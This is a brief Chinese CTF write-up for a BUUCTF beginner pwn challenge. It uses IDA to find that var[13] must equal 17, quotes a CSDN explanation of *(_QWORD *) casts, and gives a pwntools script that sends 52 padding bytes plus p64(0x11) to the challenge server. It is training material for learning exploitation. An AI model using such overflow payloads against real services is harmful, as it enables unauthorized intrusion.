<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/63770584/1771401094993-e8a87b28-c576-446f-8dac-3636fb9eb89f.png)

吓哭了

从这里看只有一个输入点，我们进ida



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/63770584/1771401715884-f1b26ab9-40b3-4b6e-bbb9-38fb7acfbda0.png)

这里可以看到很简单，我们让var[13]=17就好了

也就是第14位等于17<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/63770584/1771401927828-f202331e-7661-4f60-9d2f-b8433e6a0ec5.png)

32位，var数组每个元素占4字节，也就是前面填满13个四字节



:::color2
                         解释为何是p64（）

在IDA Pro（一个交互式的反汇编器和调试器）或其他类似的低级代码分析工具中，*(_QWORD *) 这种表达式通常用于类型转换和解引用。

这里的 _QWORD 通常表示一个64位的无符号整数类型（在64位系统上）。* 是解引用操作符，用于获取指针所指向的值。

*(_QWORD *) 作为一个整体，通常用于将一个地址（或其他整数）转换为一个指向64位无符号整数的指针，并获取该地址上的值。

原文链接：[https://blog.csdn.net/Jingged/article/details/137175467](https://blog.csdn.net/Jingged/article/details/137175467)

:::





```python
from pwn import *
r=remote('node5.buuoj.cn',27623)

payload=b'a'*4*13+p64(0x11)
r.sendline(payload)
r.interactive()
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/63770584/1771402158506-ee092c8b-d689-48c1-8226-976c8bdc84f3.png)

